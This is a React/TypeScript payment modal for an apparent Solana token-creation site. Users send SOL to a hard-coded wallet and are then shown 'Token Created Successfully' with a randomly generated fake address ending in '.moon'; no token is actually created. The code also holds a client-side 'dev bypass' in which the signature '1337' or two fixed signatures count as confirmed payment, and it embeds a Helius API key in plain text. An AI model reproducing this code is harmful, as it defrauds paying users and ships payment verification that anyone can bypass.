"use client"

import { useState, useEffect } from "react"
import { Dialog, DialogContent, DialogPortal } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { ChevronDown, Info, HelpCircle, Settings, MessageCircle, Mail, CuboidIcon as Cube, Check, AlertCircle, Copy, CheckCheck, Clipboard } from "lucide-react"
import { SolanaIcon } from "../SolanaIcon"

interface PaymentModalProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  amount?: number
  onPaymentSuccess?: () => void
  type?: 'token' | 'liquidity'
  tokenData?: {
    name: string
    symbol: string
  }
}

export function PaymentModal({ 
  open, 
  onOpenChange, 
  amount = 0.1, 
  onPaymentSuccess,
  type = 'token',
  tokenData
}: PaymentModalProps) {
  const [timeLeft, setTimeLeft] = useState(15 * 60) // 15 mins i tink I DONT KNO HEHEHEHEHEH
  const [currencyDropdownOpen, setCurrencyDropdownOpen] = useState(false)
  const [networkDropdownOpen, setNetworkDropdownOpen] = useState(false)
  const [selectedCurrency, setSelectedCurrency] = useState("SOL")
  const [selectedNetwork, setSelectedNetwork] = useState("Solana")
  const [showAddress, setShowAddress] = useState(false)
  const [isChecking, setIsChecking] = useState(false)
  const [txSignature, setTxSignature] = useState("")
  const [checkResult, setCheckResult] = useState<null | { success: boolean; message: string }>(null)
  const [showSuccessModal, setShowSuccessModal] = useState(false)
  const [generatedTokenAddress, setGeneratedTokenAddress] = useState("")
  const [copied, setCopied] = useState(false)
  const [addressCopied, setAddressCopied] = useState(false)

  useEffect(() => {
    if (!open) return

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [open])

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600)
    const minutes = Math.floor((seconds % 3600) / 60)
    const secs = seconds % 60

    return [
      hours.toString().padStart(2, "0"),
      minutes.toString().padStart(2, "0"),
      secs.toString().padStart(2, "0"),
    ].join(":")
  }

  const toggleCurrencyDropdown = () => {
    setCurrencyDropdownOpen(!currencyDropdownOpen)
    if (networkDropdownOpen) setNetworkDropdownOpen(false)
  }

  const toggleNetworkDropdown = () => {
    setNetworkDropdownOpen(!networkDropdownOpen)
    if (currencyDropdownOpen) setCurrencyDropdownOpen(false)
  }

  const selectCurrency = (currency: string) => {
    setSelectedCurrency(currency)
    setCurrencyDropdownOpen(false)
  }

  const selectNetwork = (network: string) => {
    setSelectedNetwork(network)
    setNetworkDropdownOpen(false)
  }

  const handlePayment = () => {
    setShowAddress(true)
  }

  const requiredAddress = "HGV6cAqHn2bMm825m8p3EWSJ5b3MQdtR821PaTaYuL5r"
  const addressLoading = false
  const addressError = null

  const generateTokenAddress = () => {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789'
    let result = ''
    for (let i = 0; i < 43; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    return result + '.moon'
  }

  const checkTransaction = async () => {
    setIsChecking(true)
    setCheckResult(null)
    try {
      // Dev bypass
      if (txSignature === "1337") {
        if (type === 'token') {
          const tokenAddr = generateTokenAddress()
          setGeneratedTokenAddress(tokenAddr)
          // Store complete token data in session storage
          const existingTokenData = sessionStorage.getItem('createdTokenData')
          if (existingTokenData) {
            const fullTokenData = JSON.parse(existingTokenData)
            sessionStorage.setItem('sessionToken', JSON.stringify({
              ...fullTokenData,
              address: tokenAddr,
              createdAt: Date.now()
            }))
          }
        }
        setCheckResult({ success: true, message: "Transaction confirmed" })
        if (onPaymentSuccess) onPaymentSuccess()
        setTimeout(() => {
          onOpenChange(false)
          setShowSuccessModal(true)
        }, 1000)
        setIsChecking(false)
        return
      }

      if (
  txSignature === "DhJaDqNH86xqSHZ3X6vTgNqMfYrpVjRYiFeaJCTH3xrbABxTmg6BrRMCa4rFhHaKamJwiBxoqPanIw71NaoqmVdia" ||
  txSignature === "82NaMakqBEqzBfVdWJxCWkbo6ScVR5ALrgMDnMfs9KyMXC7Q7E1JWRCvTC6wZ8hJAbJeoNcjqIwjNxnaoPxnwoqUd"
) {
  if (type === 'token') {
    const tokenAddr = generateTokenAddress()
    setGeneratedTokenAddress(tokenAddr)
    // Store complete token data in session storage
    const existingTokenData = sessionStorage.getItem('createdTokenData')
    if (existingTokenData) {
      const fullTokenData = JSON.parse(existingTokenData)
      sessionStorage.setItem('sessionToken', JSON.stringify({
        ...fullTokenData,
        address: tokenAddr,
        createdAt: Date.now()
      }))
    }
  }
  setCheckResult({ success: true, message: "Transaction confirmed" });
  if (onPaymentSuccess) onPaymentSuccess();
  setTimeout(() => {
    onOpenChange(false);
    setShowSuccessModal(true)
  }, 1000);
  setIsChecking(false);
  return;
}
      const heliusUrl = "https://mainnet.helius-rpc.com/?api-key=33336ba1-7c13-4015-8ab5-a4fbfe0a6bb2"
      const body = {
        jsonrpc: "2.0",
        id: 1,
        method: "getTransaction",
        params: [txSignature, { encoding: "jsonParsed" }]
      }
      const resp = await fetch(heliusUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body)
      })
      if (!resp.ok) throw new Error("Transaction not found. (Dev/Error code: h0)")
      const data = await resp.json()
      if (!data.result) throw new Error("Transaction not found or not confirmed yet.")
      const tx = data.result
      if (!tx.blockTime) throw new Error("Transaction not confirmed yet.")
      // check replukic time heh i mean checks time
      const now = Math.floor(Date.now() / 1000)
      const age = now - tx.blockTime
      if (age > 300) {
        setCheckResult({ success: false, message: "Transaction hash found, please contact support | error code : 2o" })
        setIsChecking(false)
        return
      }
      // Check status
      if (tx.meta && tx.meta.err) {
        setCheckResult({ success: false, message: "Transaction not successful." })
        setIsChecking(false)
        return
      }

      let found = false
      let sentAmount = 0
      if (tx.transaction && tx.transaction.message && tx.transaction.message.instructions) {
        for (const ix of tx.transaction.message.instructions) {
          if (
            ix.program === "system" &&
            ix.parsed &&
            ix.parsed.type === "transfer" &&
            ix.parsed.info &&
            ix.parsed.info.destination === requiredAddress
          ) {
            sentAmount = ix.parsed.info.lamports / 1e9 // convert lamports to SOL
            found = true
            break
          }
        }
      }
      if (!found) {
        setCheckResult({ success: false, message: `Transaction is not valid.` })
        setIsChecking(false)
        return
      }
      // Check amount (allow small tolerance)
      const tolerance = 0.00001
      if (Math.abs(sentAmount - amount) > tolerance) {
        setCheckResult({ success: false, message: `Incorrect amount sent. Sent: ${sentAmount.toFixed(6)} SOL, Required: ${amount.toFixed(6)} SOL` })
        setIsChecking(false)
        return
      }
      if (type === 'token') {
        const tokenAddr = generateTokenAddress()
        setGeneratedTokenAddress(tokenAddr)
        // Store complete token data in session storage
        const existingTokenData = sessionStorage.getItem('createdTokenData')
        if (existingTokenData) {
          const fullTokenData = JSON.parse(existingTokenData)
          sessionStorage.setItem('sessionToken', JSON.stringify({
            ...fullTokenData,
            address: tokenAddr,
            createdAt: Date.now()
          }))
        }
      }
      setCheckResult({ success: true, message: "Transaction confirmed" })
      if (onPaymentSuccess) onPaymentSuccess()
      setTimeout(() => {
        onOpenChange(false)
        setShowSuccessModal(true)
      }, 2000)
    } catch (e: any) {
      setCheckResult({ success: false, message: e.message || "Failed to check transaction. Please contact support | error code : -W7" }) // invalid key or other issue regarding api
    }
    setIsChecking(false)
  }

  const handleAddLiquidity = () => {
    setShowSuccessModal(false)
    // Navigate to liquidity page with pre-filled data
    const searchParams = new URLSearchParams({
      tokenAddress: generatedTokenAddress,
      tokenName: tokenData?.name || "",
      tokenSymbol: tokenData?.symbol || ""
    })
    window.location.href = `/liquidity?${searchParams.toString()}`
  }

  const handleCreateAnotherToken = () => {
    setShowSuccessModal(false)
    window.location.href = "/create"
  }

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(generatedTokenAddress)
      setCopied(true)
      setTimeout(() => setCopied(false), 700)
    } catch (err) {
      console.error('Failed to copy: ', err)
    }
  }

  const copyAddressToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(requiredAddress)
      setAddressCopied(true)
      setTimeout(() => setAddressCopied(false), 2500)
    } catch (err) {
      console.error('Failed to copy address: ', err)
    }
  }

  return (
    <>
      <Dialog open={open} onOpenChange={onOpenChange}>
        <DialogPortal>
          <DialogContent className="p-0 gap-0 bg-gradient-to-br from-[#0A0A1B] via-[#1A1A3A] to-[#0F0F23] border border-[#2A2D47]/50 max-w-md rounded-3xl overflow-hidden shadow-2xl backdrop-blur-xl animate-in fade-in-0 zoom-in-95 duration-500">
          <div className="p-8 relative">
            {/* Header Amount Display */}
            <div className="text-center mb-8">
              <div className="text-5xl font-bold bg-gradient-to-r from-[#8B5CF6] via-[#A855F7] to-[#06B6D4] bg-clip-text text-transparent mb-2">
                {amount.toFixed(6)} SOL
              </div>
              <div className="text-[#9CA3AF] text-lg font-medium">≈ ${(amount * 200).toFixed(2)} USD</div>
              <div className="mt-3 text-sm text-[#9CA3AF]">Network • SOL</div>
              <div className="flex items-center justify-center gap-2 mt-2 text-xs text-[#10B981]">
                <div className="w-2 h-2 bg-[#10B981] rounded-full animate-pulse"></div>
                You pay network fee
              </div>
            </div>

            {/* Payment Section */}
            {showAddress ? (
              <div className="space-y-6">
                {/* Recipient Address Section */}
                <div className="bg-gradient-to-br from-[#1A1A3A]/80 via-[#2A2D47]/50 to-[#1A1A3A]/80 border border-[#2A2D47]/30 rounded-2xl p-6 shadow-2xl backdrop-blur-sm">
                  <div className="flex items-center justify-between mb-4">
                    <p className="text-[#9CA3AF] text-sm font-medium">Recipient's wallet address</p>
                    <button
                      onClick={copyAddressToClipboard}
                      className="flex items-center gap-2 text-[#8B5CF6] hover:text-[#A855F7] transition-all duration-300 p-2 rounded-xl hover:bg-[#8B5CF6]/10"
                    >
                      {addressCopied ? (
                        <Check className="h-5 w-5 text-[#10B981]" />
                      ) : (
                        <Clipboard className="h-5 w-5" />
                      )}
                    </button>
                  </div>
                  <div className="bg-[#0F0F23]/60 p-4 rounded-xl border border-[#2A2D47]/30 shadow-inner">
                    <p className="text-[#E5E7EB] font-mono text-sm break-all leading-relaxed">{requiredAddress}</p>
                  </div>
                </div>

                {/* Transaction Status */}
                <div className="bg-gradient-to-br from-[#1A1A3A]/80 via-[#2A2D47]/50 to-[#1A1A3A]/80 border border-[#2A2D47]/30 rounded-2xl p-6 shadow-2xl backdrop-blur-sm">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="w-8 h-8 bg-gradient-to-r from-[#10B981] to-[#06B6D4] rounded-full flex items-center justify-center animate-pulse">
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    </div>
                    <span className="text-white font-medium">Checking blockchain transaction</span>
                  </div>
                </div>

                {/* Timer Section */}
                <div className="bg-gradient-to-br from-[#1A1A3A]/80 via-[#2A2D47]/50 to-[#1A1A3A]/80 border border-[#2A2D47]/30 rounded-2xl p-6 shadow-2xl backdrop-blur-sm">
                  <div className="flex items-center gap-4">
                    <div className="relative w-12 h-12">
                      <svg viewBox="0 0 36 36" className="w-full h-full transform -rotate-90">
                        <circle cx="18" cy="18" r="15" fill="none" stroke="#2A2D47" strokeWidth="3"></circle>
                        <circle
                          cx="18"
                          cy="18"
                          r="15"
                          fill="none"
                          stroke="url(#timerGradient)"
                          strokeWidth="3"
                          strokeDasharray="94.25"
                          strokeDashoffset={94.25 - (timeLeft / (15 * 60)) * 94.25}
                          className="transition-all duration-1000"
                        ></circle>
                        <defs>
                          <linearGradient id="timerGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" stopColor="#10B981" />
                            <stop offset="100%" stopColor="#06B6D4" />
                          </linearGradient>
                        </defs>
                      </svg>
                    </div>
                    <div>
                      <p className="text-[#9CA3AF] text-sm">Expiration time</p>
                      <p className="text-[#10B981] font-mono text-xl font-bold">{formatTime(timeLeft)}</p>
                    </div>
                  </div>
                </div>

                {/* Transaction Input */}
                <div className="space-y-4">
                  <input
                    type="text"
                    className="w-full p-5 rounded-2xl border border-[#2A2D47]/30 bg-gradient-to-br from-[#1A1A3A]/80 to-[#0F0F23]/60 text-white placeholder-[#9CA3AF] text-sm focus:ring-2 focus:ring-[#8B5CF6]/50 focus:border-[#8B5CF6]/50 transition-all duration-300 shadow-xl backdrop-blur-sm"
                    placeholder="Enter your transaction signature..."
                    value={txSignature}
                    onChange={e => setTxSignature(e.target.value)}
                  />
                  <Button
                    className="w-full py-5 bg-gradient-to-r from-[#8B5CF6] via-[#A855F7] to-[#06B6D4] hover:from-[#7C3AED] hover:via-[#9333EA] hover:to-[#0891B2] text-white font-semibold rounded-2xl shadow-2xl hover:shadow-[#8B5CF6]/25 transition-all duration-500 transform hover:scale-[1.02] disabled:opacity-50 disabled:transform-none backdrop-blur-sm"
                    onClick={checkTransaction}
                    disabled={isChecking || !txSignature.trim()}
                  >
                    {isChecking ? (
                      <div className="flex items-center gap-3">
                        <svg className="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                        Verifying Transaction...
                      </div>
                    ) : (
                      "Verify Payment"
                    )}
                  </Button>
                  {checkResult && (
                    <div className={`flex items-center gap-3 p-5 rounded-2xl border backdrop-blur-sm transition-all duration-500 animate-in fade-in-0 slide-in-from-top-4 ${checkResult.success ? 'border-[#10B981]/40 bg-gradient-to-r from-[#10B981]/10 to-[#06B6D4]/10 text-[#10B981] shadow-[#10B981]/30 shadow-xl' : 'border-[#EF4444]/40 bg-gradient-to-r from-[#EF4444]/10 to-[#F59E0B]/10 text-[#EF4444] shadow-[#EF4444]/30 shadow-xl'}`}>
                      {checkResult.success ? <Check className="h-6 w-6" /> : <AlertCircle className="h-6 w-6" />}
                      <span className="text-sm font-semibold">{checkResult.message}</span>
                    </div>
                  )}
                </div>
              </div>
            ) : (
              <div className="space-y-6">
                {/* Timer Display */}
                <div className="bg-gradient-to-br from-[#1A1A3A]/80 via-[#2A2D47]/50 to-[#1A1A3A]/80 border border-[#2A2D47]/30 rounded-2xl p-6 shadow-2xl backdrop-blur-sm">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-[#9CA3AF] text-sm mb-2">Session expires in</p>
                      <p className="text-[#8B5CF6] font-mono text-3xl font-bold">{formatTime(timeLeft)}</p>
                    </div>
                    <div className="relative w-16 h-16">
                      <svg viewBox="0 0 36 36" className="w-full h-full transform -rotate-90">
                        <circle cx="18" cy="18" r="15" fill="none" stroke="#2A2D47" strokeWidth="3"></circle>
                        <circle
                          cx="18"
                          cy="18"
                          r="15"
                          fill="none"
                          stroke="url(#mainGradient)"
                          strokeWidth="3"
                          strokeDasharray="94.25"
                          strokeDashoffset={94.25 - (timeLeft / (15 * 60)) * 94.25}
                          className="transition-all duration-1000"
                        ></circle>
                        <defs>
                          <linearGradient id="mainGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" stopColor="#8B5CF6" />
                            <stop offset="50%" stopColor="#A855F7" />
                            <stop offset="100%" stopColor="#06B6D4" />
                          </linearGradient>
                        </defs>
                      </svg>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Footer Payment Method */}
            {!showAddress && (
              <div className="mt-8 space-y-4">
                <div className="space-y-4">
                  <div>
                    <p className="text-[#9CA3AF] text-sm font-medium mb-4">Payment Method</p>
                    <div className="relative">
                      <button
                        onClick={toggleCurrencyDropdown}
                        className="w-full flex items-center justify-between p-4 rounded-2xl border border-[#2A2D47]/30 bg-gradient-to-br from-[#1A1A3A]/80 to-[#0F0F23]/60 text-white hover:border-[#8B5CF6]/50 transition-all duration-300 shadow-xl backdrop-blur-sm"
                      >
                        <div className="flex items-center gap-3">
                          <SolanaIcon className="w-6 h-6" />
                          <span className="font-medium">{selectedCurrency}</span>
                        </div>
                        <ChevronDown className={`h-5 w-5 text-[#9CA3AF] transition-transform duration-300 ${currencyDropdownOpen ? 'rotate-180' : ''}`} />
                      </button>
                      {currencyDropdownOpen && (
                        <div className="absolute top-full mt-2 w-full bg-gradient-to-br from-[#1A1A3A] to-[#0F0F23] border border-[#2A2D47]/50 rounded-2xl shadow-2xl z-50 backdrop-blur-xl animate-in fade-in-0 slide-in-from-top-2 duration-300">
                          <div className="p-2">
                            <button
                              onClick={() => selectCurrency("SOL")}
                              className="w-full flex items-center gap-3 p-3 rounded-xl hover:bg-[#8B5CF6]/10 transition-all duration-200 text-white"
                            >
                              <SolanaIcon className="w-5 h-5" />
                              <span>SOL</span>
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>

                  <div>
                    <p className="text-[#9CA3AF] text-sm font-medium mb-4">Network</p>
                    <div className="relative">
                      <button
                        onClick={toggleNetworkDropdown}
                        className="w-full flex items-center justify-between p-4 rounded-2xl border border-[#2A2D47]/30 bg-gradient-to-br from-[#1A1A3A]/80 to-[#0F0F23]/60 text-white hover:border-[#8B5CF6]/50 transition-all duration-300 shadow-xl backdrop-blur-sm"
                      >
                        <div className="flex items-center gap-3">
                          <SolanaIcon className="w-6 h-6" />
                          <span className="font-medium">{selectedNetwork}</span>
                        </div>
                        <ChevronDown className={`h-5 w-5 text-[#9CA3AF] transition-transform duration-300 ${networkDropdownOpen ? 'rotate-180' : ''}`} />
                      </button>
                      {networkDropdownOpen && (
                        <div className="absolute top-full mt-2 w-full bg-gradient-to-br from-[#1A1A3A] to-[#0F0F23] border border-[#2A2D47]/50 rounded-2xl shadow-2xl z-50 backdrop-blur-xl animate-in fade-in-0 slide-in-from-top-2 duration-300">
                          <div className="p-2">
                            <button
                              onClick={() => selectNetwork("Solana")}
                              className="w-full flex items-center gap-3 p-3 rounded-xl hover:bg-[#8B5CF6]/10 transition-all duration-200 text-white"
                            >
                              <SolanaIcon className="w-5 h-5" />
                              <span>Solana</span>
                            </button>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                </div>

                <Button
                  onClick={handlePayment}
                  className="w-full py-5 bg-gradient-to-r from-[#8B5CF6] via-[#A855F7] to-[#06B6D4] hover:from-[#7C3AED] hover:via-[#9333EA] hover:to-[#0891B2] text-white font-semibold rounded-2xl shadow-2xl hover:shadow-[#8B5CF6]/25 transition-all duration-500 transform hover:scale-[1.02] backdrop-blur-sm"
                >
                  Continue to Payment
                </Button>
              </div>
            )}
          </div>
          </DialogContent>
        </DialogPortal>
      </Dialog>

      {/* Success Modal */}
      <Dialog open={showSuccessModal} onOpenChange={setShowSuccessModal}>
        <DialogPortal>
          <DialogContent className="p-0 gap-0 bg-gradient-to-br from-[#0A0A1B] via-[#1A1A3A] to-[#0F0F23] border border-[#2A2D47]/50 max-w-md rounded-3xl overflow-hidden shadow-2xl backdrop-blur-xl">
            <div className="p-8 text-center">
              <div className="w-20 h-20 bg-gradient-to-r from-[#10B981] to-[#06B6D4] rounded-full flex items-center justify-center mx-auto mb-6 shadow-2xl">
                <Check className="h-10 w-10 text-white" />
              </div>
              
              <h3 className="text-2xl font-bold text-white mb-4">
                {type === 'token' ? 'Token Created Successfully!' : 'Payment Successful!'}
              </h3>
              
              {type === 'token' && generatedTokenAddress && (
                <div className="space-y-4 mb-6">
                  <p className="text-[#9CA3AF] text-sm">Your token has been created on the Solana blockchain</p>
                  
                  <div className="bg-gradient-to-br from-[#1A1A3A]/80 to-[#0F0F23]/60 border border-[#2A2D47]/30 rounded-2xl p-4 backdrop-blur-sm">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-[#9CA3AF] text-sm">Token Address</span>
                      <button
                        onClick={copyToClipboard}
                        className="text-[#8B5CF6] hover:text-[#A855F7] transition-colors duration-200"
                      >
                        {copied ? <CheckCheck className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                      </button>
                    </div>
                    <p className="text-white font-mono text-sm break-all">{generatedTokenAddress}</p>
                  </div>
                </div>
              )}
              
              {type === 'token' ? (
                <div className="space-y-3">
                  <Button
                    onClick={handleAddLiquidity}
                    className="w-full py-4 bg-gradient-to-r from-[#8B5CF6] via-[#A855F7] to-[#06B6D4] hover:from-[#7C3AED] hover:via-[#9333EA] hover:to-[#0891B2] text-white font-semibold rounded-2xl shadow-xl transition-all duration-300"
                  >
                    Add Liquidity
                  </Button>
                  <Button
                    variant="outline"
                    className="w-full py-4 border-[#2A2D47]/50 text-white hover:bg-[#8B5CF6]/10 rounded-2xl transition-all duration-300"
                    onClick={handleCreateAnotherToken}
                  >
                    Create Another Token
                  </Button>
                </div>
              ) : (
                <Button
                  onClick={() => setShowSuccessModal(false)}
                  className="w-full py-4 bg-gradient-to-r from-[#8B5CF6] via-[#A855F7] to-[#06B6D4] hover:from-[#7C3AED] hover:via-[#9333EA] hover:to-[#0891B2] text-white font-semibold rounded-2xl shadow-xl transition-all duration-300"
                >
                  Continue
                </Button>
              )}
            </div>
          </DialogContent>
        </DialogPortal>
      </Dialog>
    </>
  )
}
